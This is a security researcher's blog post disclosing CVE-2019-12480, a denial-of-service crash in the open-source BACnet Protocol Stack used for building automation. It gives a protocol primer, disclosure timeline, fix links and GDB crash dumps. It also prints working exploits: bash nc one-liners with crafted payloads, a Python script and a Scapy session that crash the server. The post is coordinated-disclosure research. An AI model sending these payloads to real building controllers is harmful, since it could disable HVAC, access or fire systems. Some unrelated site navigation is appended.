=== Content from 1modm.github.io_fae2794f_20250121_002910.html ===


* [Home](/)
* [About](/about.html)
* [Posts](/notes.html)
* [Notes](https://1modm.github.io/documentation/)
* [Repositories](https://github.com/1modm?tab=repositories)

## [M](/ "Home")

August 20, 2019 ·
17 minutes read

# BACnet CVE-2019-12480

Is there an increase of interest and focus in Cybersecurity referring to Industrial Control Systems (ICSs), not only PLCs, HMIs, RTUs and sensors, there are other elements like chillers, industrial refrigeration, fire detection, fire suppression, energy storage, HVACs, etc. which can be managed through the BACnet protocol.

Usually are referenced under the term “Intelligent Buildings”, however, their use is neither exclusive to them nor is it something relatively new. The building management is given by the acronym BMS, Building Management System and must be distinguished between residential buildings or industrial buildings. In general, BMS systems integrate a set of subsystems in charge of lighting, fire, alarm, elevator, ventilation, temperature, etc. control systems. Although many of them are common to both environments we cannot say that they are similar since the applications and scope are different.

These systems must communicate with each other for their own operation and management. One of the protocols used is BACnet (Buiding Automation Control Network) a Data Communication Protocol for Building Automation and Control Networks approved by the ASHRAE Standards Committee. In June 1987 the American Society of Heating, Refrigeration and Air-conditioning Engineers (ASHRAE) set up the Standard Project Committee 135 (SPC 135) to develop a data communications protocol for Building, Automation and Control Networks (BACnet). As well as becoming a US national standard in 1995 (ASHRAE/ANSI 135-1995) and then updated in 2001, in many countries it also became an ISO standard 16484-5 in January 2003. BACnet also became a European standard CEN TC 247 in 2003.

BACnet has been designed specifically to meet the communication needs of building automation and control systems for applications such as heating, ventilating, and air-conditioning control, lighting control, access control, and fire detection systems. The BACnet protocol provides mechanisms by which computerized equipment of arbitrary function may exchange information, regardless of the particular building service it performs. As a result, the BACnet protocol may be used by head-end computers, general-purpose direct digital controllers, and application specific or unitary controllers with equal effect.

Like many others, each BACNet device is a combination of hardware and software, like devices working as controllers, gateways or user interfaces. Each of them has a unique identifier or instance number that identifies and differentiates them from those existing in the network apart from others with information regarding the inputs and outputs that these devices monitors and controls.

In BACnet we can find 3 differentiated concepts, Objects, Properties and Services, all the information contained within a BACnet device is ordered as objects, which makes it a protocol oriented precisely to this, to objects. Each “Object” represents a component of the device itself or a set of information that can be requested by another through other protocols or layers such as Ethernet, IP, RS-485, etc. The protocol defines more than 50 types of objects for the most common uses.

## BACnet

BACnet was designed to allow communication of building automation and control systems for applications such as heating, ventilating, and air-conditioning control (HVAC), lighting control, access control, and fire detection systems and their associated equipment. The BACnet protocol provides mechanisms for computerized building automation devices to exchange information, regardless of the particular building service they perform.

BACnet is a communications protocol for Building Automation and Control (BAC) networks UDP based and contains 3 main headers the BVLC, NPDU and APDU.

A request to BACnet passes down through the lower layers of the protocol stack in the local device, this process can be observed in the next image [Source](http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf).

![BACnet_protocol_stack_data_flow](public/images/BACnet_protocol_stack_data_flow.png "BACnet_protocol_stack_data_flow")

The 3 headers can be examined in the [BACnet Wiki](http://www.bacnetwiki.com/wiki/index.php?title=Main_Page)

![BACnet_packet](public/images/BACnet_packet.png "BACnet_packet")

### BVLC (BACNet virtual link control): 4 bytes

The firts byte defines the type, in this case bacnet/ip 0x81, the second one defines the function 0x0a, and the last 2 bytes defines the length of the whole packet [BACnet Wiki](http://www.bacnetwiki.com/wiki/index.php?title=BACnet_Virtual_Link_Layer):

* The firts byte defines the type: bacnet/ip 0x81
* The second byte defines the function 0x0a (ORIGINAL\_UNICAST\_NPDU = 10)
* The last 2 bytes defines the length of the whole packet

![bvlc](public/images/bvlc.png "bvlc")

* NPDU Function:

![bvlc](public/images/bvlc-function.png "bvlc")

As we can see in the BACnet packet the UDP Port number used by BACnet communications over IP is 47808:

![bvlc](public/images/bvlc-pcap.png "bvlc")

### NPDU (Network layer protocol data unit): 2 bytes

The NPDU consists of a NPCI followed by a NSDU. [BACnet Wiki](http://www.bacnetwiki.com/wiki/index.php?title=Network_Layer_Protocol_Data_Unit)

According bacnetwiki this is the representation, but be careful here, in practice the headers is just 2 bytes, Version (Always 0x01) and NPCI Control Octet:

![npdu](public/images/npdu.png "npdu")

NPDU Layer:

![npdu](public/images/npdu-pcap.png "npdu")

### APDU (Network layer protocol data unit): 2 bytes

BACnet APDUs carry the Application Layer parameters. The maximum size of an APDU is specified by a device’s Max\_APDU\_Length\_Accepted, be careful with that, otherwise you will face malformed packet issues. [BACnet APDU](http://www.bacnetwiki.com/wiki/index.php?title=APDU)

![apdu](public/images/apdu-pcap.png "apdu")

## Testbed

If we want to create our own lab and scenario we can install the OpenSource BACnet Protocol Stack and test the connectivity to BACnet port, we need:

* [The Free or Open Source Software BACnet Stack](https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/)
* A BACNet port open UDP 47808

```
$ sudo apt-get install -y build-essential
$ sudo apt-get install subversion
$ svn checkout svn://svn.code.sf.net/p/bacnet/code/trunk/bacnet-stack bacnetServer
$ cd bacnetServer
$ make clean all
$ demo/server/bacserv

```
# CVE-2019-12480: BACnet Protocol Stack Segmentation fault leading to denial of service

## Disclosure Timeline

* 20/05/2019 Discovered vulnerability and developed baseline proof-of-concept.
* 24/05/2019 Reported to https://sourceforge.net/p/bacnet/bugs/61/
* 28/05/2019 Anonymous reported similar issue to https://sourceforge.net/p/bacnet/bugs/62/
* 29/05/2019 Updated disclosure, sent notes and exploits. Asked for a CVE and coordinated disclosure.
* 19/07/2019 Updated CVE Description CVE-2019-12480.
* 20/08/2019 Public disclosure

## Description

BACnet Protocol Stack through 0.8.6 has a segmentation fault leading to denial of service in BACnet APDU Layer because a malformed DCC in AtomicWriteFile, AtomicReadFile and DeviceCommunicationControl services. An unauthenticated remote attacker could cause a denial of service (bacserv daemon crash) because there is an invalid read in bacdcode.c during parsing of alarm tag numbers.

## CVE

[NVD CVE-2019-12480 Details](https://nvd.nist.gov/vuln/detail/CVE-2019-12480)

* Score: 7.5 High
* CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
* CWE: CWE-125
* cpe:2.3:a:bacnet\_protocol\_stack\_project:bacnet\_protocol\_stack:*:*:*:*:*:*:*:* Up to (including) 0.8.6

## Bug References and Exploit

* <https://sourceforge.net/p/bacnet/bugs/61/>
* <https://sourceforge.net/p/bacnet/bugs/62/>
* <https://www.exploit-db.com/exploits/47148>
* <http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html>

## Fixes

* <https://sourceforge.net/p/bacnet/code/3220>
* <https://sourceforge.net/p/bacnet/code/3223>
* <https://sourceforge.net/p/bacnet/code/3224>
* <https://sourceforge.net/p/bacnet/code/3225>

# Faults analysis

During some fuzzing tests were detected a segmentation fault in the following services:

* Device Communication Control
* Atomic Read File
* Atomic Write File

## Fault in Device Communication Control Service

Stack and GDB output for segmentation fault in the Device Communication Control service:

```
Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
Signal si_signo: 11 Signal si_addr: 2154041910
Nearby code:
   0x000000000041374e <+19>:    mov    rdx,rbx
   0x0000000000413751 <+22>:    xor    eax,eax
   0x0000000000413753 <+24>:    mov    rsi,rbp
   0x0000000000413756 <+27>:    mov    edi,0x426a0a
   0x000000000041375b <+32>:    call   0x401170 <printf@plt>
=> 0x0000000000413760 <+37>:    mov    al,BYTE PTR [rbp+0x0]
   0x0000000000413763 <+40>:    mov    dl,al
   0x0000000000413765 <+42>:    and    edx,0xfffffff0
   0x0000000000413768 <+45>:    cmp    dl,0xf0
   0x000000000041376b <+48>:    jne    0x413779 <decode_tag_number+62>
Stack trace:
#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  1 decode_is_context_tag at 0x413974 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  2 dcc_decode_service_request at 0x418428 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  3 handler_device_communication_control at 0x41e079 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Description: Access violation on source operand
Short description: SourceAv (19/22)
Hash: 0c6889881a5d7caa77aa0dbc2027317f.b3c82754609555d1d0273757f67cf6ca
Exploitability Classification: UNKNOWN
Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
Other tags: AccessViolation (21/22)

--- Info Frame ---

Stack level 0, frame at 0x7fffffffdc50:
 rip = 0x413760 in decode_tag_number; saved rip 0x413974
 called by frame at 0x7fffffffdc80
 Arglist at 0x7fffffffdc30, args:
 Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
 Saved registers:
  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48

--- Info Registers ---

rax            0x12 18
rbx            0x7fffffffdc5f   140737488346207
rcx            0x11 17
rdx            0x0  0
rsi            0x0  0
rdi            0x7fffffffd700   140737488344832
rbp            0x80641236   0x80641236
rsp            0x7fffffffdc30   0x7fffffffdc30
r8             0x1  1
r9             0x7ffff7a5b14d   140737348219213
r10            0x65626d756e5f6761   7305521896678713185
r11            0x0  0
r12            0x7fffffffdd08   140737488346376
r13            0xc  12
r14            0x7fffffffdce0   140737488346336
r15            0x80641236   2154041910
rip            0x413760 0x413760 <decode_tag_number+37>
eflags         0x10206  [ PF IF RF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0

--- Backtrace ---

Thread 1 (Thread 0x7ffff7fe2740 (LWP 21011)):
#0  0x0000000000413760 in decode_tag_number ()
No symbol table info available.
#1  0x0000000000413974 in decode_is_context_tag ()
No symbol table info available.
#2  0x0000000000418428 in dcc_decode_service_request ()
No symbol table info available.
#3  0x000000000041e079 in handler_device_communication_control ()
No symbol table info available.
#4  0x00000000004134f7 in apdu_handler ()
No symbol table info available.
#5  0x000000000041c508 in npdu_handler ()
No symbol table info available.
#6  0x000000000040169a in main ()
No symbol table info available.

```
## Fault in Atomic Read File Service

Stack and GDB output for segmentation fault in the Atomic Read File service:

```
Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
Signal si_signo: 11 Signal si_addr: 18446744073168944418
Nearby code:
   0x000000000041374e <+19>:    mov    rdx,rbx
   0x0000000000413751 <+22>:    xor    eax,eax
   0x0000000000413753 <+24>:    mov    rsi,rbp
   0x0000000000413756 <+27>:    mov    edi,0x426a0a
   0x000000000041375b <+32>:    call   0x401170 <printf@plt>
=> 0x0000000000413760 <+37>:    mov    al,BYTE PTR [rbp+0x0]
   0x0000000000413763 <+40>:    mov    dl,al
   0x0000000000413765 <+42>:    and    edx,0xfffffff0
   0x0000000000413768 <+45>:    cmp    dl,0xf0
   0x000000000041376b <+48>:    jne    0x413779 <decode_tag_number+62>
Stack trace:
#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  1 decode_tag_number_and_value at 0x4137f9 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  2 arf_decode_service_request at 0x417df8 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  3 handler_atomic_read_file at 0x41d9ab in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Description: Access violation on source operand
Short description: SourceAv (19/22)
Hash: 39996a2c279b3763d9d7c9d644e36915.5dfb5ba5080de8d79c6b66b3f106b103
Exploitability Classification: UNKNOWN
Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
Other tags: AccessViolation (21/22)

--- Info Frame ---

Stack level 0, frame at 0x7fffffffdc50:
 rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
 called by frame at 0x7fffffffdc80
 Arglist at 0x7fffffffdc30, args:
 Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
 Saved registers:
  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48

--- Info Registers ---

rax            0x11 17
rbx            0x7fffffffdc89   140737488346249
rcx            0x10 16
rdx            0x0  0
rsi            0x0  0
rdi            0x7fffffffd700   140737488344832
rbp            0xffffffffdfc6fd22   0xffffffffdfc6fd22
rsp            0x7fffffffdc30   0x7fffffffdc30
r8             0x1  1
r9             0x7ffff7a5b14d   140737348219213
r10            0x65626d756e5f6761   7305521896678713185
r11            0x0  0
r12            0xffffffffdfc6fd22   -540607198
r13            0x640f1b 6557467
r14            0x640f16 6557462
r15            0x11 17
rip            0x413760 0x413760 <decode_tag_number+37>
eflags         0x10206  [ PF IF RF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0

--- Backtrace ---

Thread 1 (Thread 0x7ffff7fe2740 (LWP 20992)):
#0  0x0000000000413760 in decode_tag_number ()
No symbol table info available.
#1  0x00000000004137f9 in decode_tag_number_and_value ()
No symbol table info available.
#2  0x0000000000417df8 in arf_decode_service_request ()
No symbol table info available.
#3  0x000000000041d9ab in handler_atomic_read_file ()
No symbol table info available.
#4  0x00000000004134f7 in apdu_handler ()
No symbol table info available.
#5  0x000000000041c508 in npdu_handler ()
No symbol table info available.
#6  0x000000000040169a in main ()
No symbol table info available.

```
### Fault in Atomic Write File Service

Stack and GDB output for segmentation fault in the Atomic Write File service:

```
Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
Signal si_signo: 11 Signal si_addr: 18446744072714559995
Nearby code:
   0x000000000041374e <+19>:    mov    rdx,rbx
   0x0000000000413751 <+22>:    xor    eax,eax
   0x0000000000413753 <+24>:    mov    rsi,rbp
   0x0000000000413756 <+27>:    mov    edi,0x426a0a
   0x000000000041375b <+32>:    call   0x401170 <printf@plt>
=> 0x0000000000413760 <+37>:    mov    al,BYTE PTR [rbp+0x0]
   0x0000000000413763 <+40>:    mov    dl,al
   0x0000000000413765 <+42>:    and    edx,0xfffffff0
   0x0000000000413768 <+45>:    cmp    dl,0xf0
   0x000000000041376b <+48>:    jne    0x413779 <decode_tag_number+62>
Stack trace:
#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  1 decode_tag_number_and_value at 0x4137f9 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  2 awf_decode_service_request at 0x42062b in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  3 handler_atomic_write_file at 0x41dc13 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Description: Access violation on source operand
Short description: SourceAv (19/22)
Hash: 30f5f3fdb0db788098ed886be3d45933.f25bdc8062c3fd1d5fec8cfd4c618d89
Exploitability Classification: UNKNOWN
Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
Other tags: AccessViolation (21/22)

--- Info Frame ---

Stack level 0, frame at 0x7fffffffdc50:
 rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
 called by frame at 0x7fffffffdc80
 Arglist at 0x7fffffffdc30, args:
 Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
 Saved registers:
  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48

--- Info Registers ---

rax            0x11 17
rbx            0x7fffffffdc81   140737488346241
rcx            0x10 16
rdx            0x0  0
rsi            0x0  0
rdi            0x7fffffffd700   140737488344832
rbp            0xffffffffc4b1a1fb   0xffffffffc4b1a1fb
rsp            0x7fffffffdc30   0x7fffffffdc30
r8             0x1  1
r9             0x7ffff7a5b14d   140737348219213
r10            0x65626d756e5f6761   7305521896678713185
r11            0x0  0
r12            0xffffffffc4b1a1fb   -994991621
r13            0x640f1b 6557467
r14            0x640f16 6557462
r15            0x21 33
rip            0x413760 0x413760 <decode_tag_number+37>
eflags         0x10206  [ PF IF RF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0

--- Backtrace ---

Thread 1 (Thread 0x7ffff7fe2740 (LWP 20726)):
#0  0x0000000000413760 in decode_tag_number ()
No symbol table info available.
#1  0x00000000004137f9 in decode_tag_number_and_value ()
No symbol table info available.
#2  0x000000000042062b in awf_decode_service_request ()
No symbol table info available.
#3  0x000000000041dc13 in handler_atomic_write_file ()
No symbol table info available.
#4  0x00000000004134f7 in apdu_handler ()
No symbol table info available.
#5  0x000000000041c508 in npdu_handler ()
No symbol table info available.
#6  0x000000000040169a in main ()
No symbol table info available.

```
# Exploits

Based on previous information were developed some exploits as Proof of concept.

## Bash

Device Communication Control payload:

```
echo -ne '\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41' | nc -u 192.168.10.10 47808

```

Atomic Read File service payload:

```
echo -ne '\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f' | nc -u 192.168.10.10 47808

```

Atomic Write File service payload:

```
echo -ne '\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f' | nc -u 192.168.10.10 47808

```
## Python

Using the output generated by the fuzzer and gdb could be possible to generate some POC exploits:

<https://www.exploit-db.com/exploits/47148>

```
# Exploit Title: BACnet Stack 0.8.6 - Denial of Service
# Exploit Author: mmorillo
# Vendor Homepage: https://sourceforge.net/p/bacnet/
# Software Link: https://sourceforge.net/projects/bacnet/files/bacnet-stack/bacnet-stack-0.8.6/
# Version: bacnet-stack-0.8.6
# Tested on: Linux
# CVE: CVE-2019-12480

#!/usr/bin/env python
#
# After reported the bug to the vendor, sharing details
# about the vulnerability, as well as proof-of-concept code (exploit code to
# test), has been release a fix for 0.8.7 release of
# BACnet Protocol Stack https://sourceforge.net/p/bacnet/

import socket
import struct
import argparse
import os
import sys
from termcolor import colored

#------------------------------------------------------------------------------
# Command line parser using argparse
#------------------------------------------------------------------------------

def cmdline_parser():
    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True,
             description='BACnet Protocol Stack Segmentation fault leading to denial of service', version='0.1',
             usage="python %(prog)s")

    # Mandatory
    parser.add_argument('Server', type=str, help='BACnet server IP')
    parser.add_argument('Port', type=str, help='BACnet port')

    return parser

def get_Host_name_IP():
    try:
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
        return host_ip
    except:
        print("Unable to get Hostname and IP")

def target_alive(BACnetServer, BACnetPort):
    response = os.system("nc -u -z -w 1 " + BACnetServer + " " + str(BACnetPort))

    if response == 0:
        return True
    else:
        return False

#------------------------------------------------------------------------------
# Main of program
#------------------------------------------------------------------------------

def main():

    # Get the command line parser.
    parser = cmdline_parser()

    # Show help if no args
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Get results line parser.
    results = parser.parse_args()

    BACnetServer = results.Server
    BACnetPort = int(results.Port)
    SRC_IP = get_Host_name_IP()

    if not target_alive(BACnetServer, BACnetPort):
        print((colored("[+] BACnet server down", "yellow")))

    else:
        if target_alive(BACnetServer, BACnetPort):

            payload_DeviceCommunicationControl = "\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41"

            print((colored("[+] Sending BACnet DeviceCommunicationControl payload from " + SRC_IP, "green")))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack('>I',len(payload_DeviceCommunicationControl)))
            s.send(payload_DeviceCommunicationControl)

            print((colored("[+] Sent Payload: " + payload_DeviceCommunicationControl.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))

        if target_alive(BACnetServer, BACnetPort):

            payload_AtomicReadFile = "\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f"

            print((colored("[+] Sending BACnet AtomicReadFile payload from " + SRC_IP, "green")))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack('>I',len(payload_AtomicReadFile)))
            s.send(payload_AtomicReadFile)

            print((colored("[+] Sent Payload: " + payload_AtomicReadFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))

        if target_alive(BACnetServer, BACnetPort):

            payload_AtomicWriteFile = "\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f"

            print((colored("[+] Sending BACnet AtomicWriteFile payload from " + SRC_IP, "green")))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack('>I',len(payload_AtomicWriteFile)))
            s.send(payload_AtomicWriteFile)

            print((colored("[+] Sent Payload: " + payload_AtomicWriteFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), "yellow")))

        if not target_alive(BACnetServer, BACnetPort):
            print((colored("[+] DoS completed", "red")))

#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

if __name__ == '__main__':
    main()

```
## Scapy

Using the partially implemented [BACnet layer for Scapy](https://github.com/desolat/scapy-bacnet) can be generated the BLVC, NPDU and APDU layers in order to send the specific exploit octets. For example:

```
$ python
Python 2.7.16 (default, Apr  1 2019, 14:50:41)
[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from bacnet import BvlcFunction, BVLC, BACNET_PORT, NPDU, NetworkLayerMessageType, hexStringToIntList, APDU, PduType, UnconfirmedServiceChoice
>>> from scapy.layers.inet import IP, UDP
>>> from scapy.all import *
>>> DST_IP = '192.168.10.10'
>>> SRC_PORT = 63491
>>> BACNET_PORT = 47808
>>>
>>>
>>> udp = IP(dst=DST_IP) / UDP(sport=SRC_PORT, dport=BACNET_PORT)
>>>
>>> bvlc = udp / BVLC(function=BvlcFunction.ORIGINAL_UNICAST_NPDU)
>>>
>>> npdu = bvlc / NPDU(nlpci=0b00000100)
>>>
>>> apdu = npdu / APDU(pdu_type=PduType.CONFIRMED_REQUEST,service_choice=UnconfirmedServiceChoice.DEVICECOMMUNICATIONCONTROL)  / Raw("\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41")
>>>
>>> apdu.display()

###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     =
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = None
  src       = 192.168.10.5
  dst       = 192.168.10.10
  \options   \
###[ UDP ]###
     sport     = 63491
     dport     = bacnet
     len       = None
     chksum    = None
###[ BVLC ]###
        type      = 0x81
        function  = ORIGINAL_UNICAST_NPDU
        length    = None
###[ NPDU ]###
           version   = 1
           nlpci     = 4
###[ APDU ]###
              pdu_type  = CONFIRMED_REQUEST
              reserved  = 0
              max_response_segments= 0x5
              invoke_id = 0x1
              service_choice= DEVICECOMMUNICATIONCONTROL
###[ Raw ]###
                 load      = '\r\xff\x80\x00\x03\x1a\n\x19\x00*\x00A'

>>> send(apdu)
.
Sent 1 packets.

```
## Segmentation Fault

```
$ ./bacserv
BACnet Server Demo
BACnet Stack Version 0.8.6
BACnet Device ID: 260001
Max APDU: 1476
DeviceCommunicationControl!
Violación de segmento (`core' generado)

```
# References

* [135\_2004](http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf)
* [BACnet Wiki](http://www.bacnetwiki.com/wiki/index.php?title=Main_Page)
* [The Free or Open Source Software BACnet Stack](https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/)
* [BACnet Protocol Stack](https://sourceforge.net/projects/bacnet/)
* [NVD CVE-2019-12480 Details](https://nvd.nist.gov/vuln/detail/CVE-2019-12480)
* <https://sourceforge.net/p/bacnet/bugs/61/>
* <https://sourceforge.net/p/bacnet/bugs/62/>
* <https://www.exploit-db.com/exploits/47148>
* <http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html>
* <https://sourceforge.net/p/bacnet/code/3220>
* <https://sourceforge.net/p/bacnet/code/3223>
* <https://sourceforge.net/p/bacnet/code/3224>
* <https://sourceforge.net/p/bacnet/code/3225>
* [BACnet ashrae](https://www.ashrae.org/technical-resources/bookstore/bacnet)
* [BACnet rhyshaden resources](http://www.rhyshaden.com/bacnet.htm)

 [Back](/notes.html)

Made with  using [Jekyll](http://jekyllrb.com) ·  on [GitHub](https://github.com/heiswayi/heiswayi.github.io_jekyll_source)
© 2024



=== Content from 1modm.github.io_e712b6ae_20250121_023630.html ===


Toggle navigation

[Notes](index.html)

* [Gitpage](https://1modm.github.io/)
* [Github](https://github.com/1modm)

* Notes 1.0
* Overview
  + [Get started](index.html)* Tools
    + [Open Source Security Tools](opensourcetools.html)
    + [Metadata Anonymisation Toolkit](mat.html)
    + [Git Commands and Best Practices Cheat Sheet](gitcommands.html)
    + [Wordlist's](wordlists.html)
    + [OpenVPN](openvpn.html)
    + [SSL](ssl.html)
    + [SELinux](selinux.html)
    + [Privacy](privacy.html)* Troubleshooting
      + [Disk](testdisk.html)
      + [Processes](processes.html)
      + [Files](files.html)* Networking
        + [tcpdump](tcpdump.html)
        + [ngrep](ngrep.html)
        + [netstat](netstat.html)
        + [lsof](lsof_net.html)
        + [netcat](netcat.html)
        + [arping](arping.html)
        + [Network driver and hardware settings](ethtool.html)
        + [tshark](tshark.html)
        + [PXE](pxe.html)* Databases
          + [MySQL](mysql.html)
          + [PostgreSQL](postgresql.html)* IDS
            + [Snort](snort.html)
            + [Suricata](suricata.html)* Gadget
              + [Essentials Toolkit](hak5.html)* OSINT
                + [Tools](osint-tools.html)* Malware
                  + [Links](malware-links.html)
                  + [Tools](malware-tools.html)* PowerShell
                    + [PowerShell Tutorials](powershell-tutorials.html)
                    + [PowerShell Tools](powershell-tools.html)* Red Team
                      + [Training](training.html)
                      + [Pentesting](pentesting.html)
                      + [Penetration Testing Tools Cheat Sheet](pentestcheat.html)
                      + [Scapy Cheat Sheet from SANS SEC560](scapycheat.html)
                      + [CTF](ctf.html)
                      + [OSCP](oscp.html)
                      + [Reversing](reversing.html)
                      + [Privilege Escalation](escalation-priv.html)
                      + [Android](android.html)
                      + [Fuzzing](fuzzing.html)* Blue Team
                        + [Hardening](hardening.html)
                        + [DDoS](ddos.html)* DFIR
                          + [Links](dfir_links.html)
                          + [Tools](dfir_tools.html)* Programming
                            + [python](python.html)
                            + [Django](django.html)* Software Defined Radio
                              + [SDR](sdr.html)* CCN-CERT
                                + [CCN-CERT](ccn-cert.html)* Blogs and resources
                                  + [Blogs](blogs.html)
                                  + [Resources](resources.html)* Machine Learning
                                    + [Blogs](machine_learning_blogs.html)
                                    + [Resources](machine_learning_resources.html)

# Index

Index.

---

©2024 M. All rights reserved.

Site last generated: Jan 11, 2024

Cloned from [idratherbewriting](http://idratherbewriting.com/documentation-theme-jekyll/)



=== Content from github.com_f4115c50_20250121_023629.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F1modm%3Ftab%3Drepositories)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
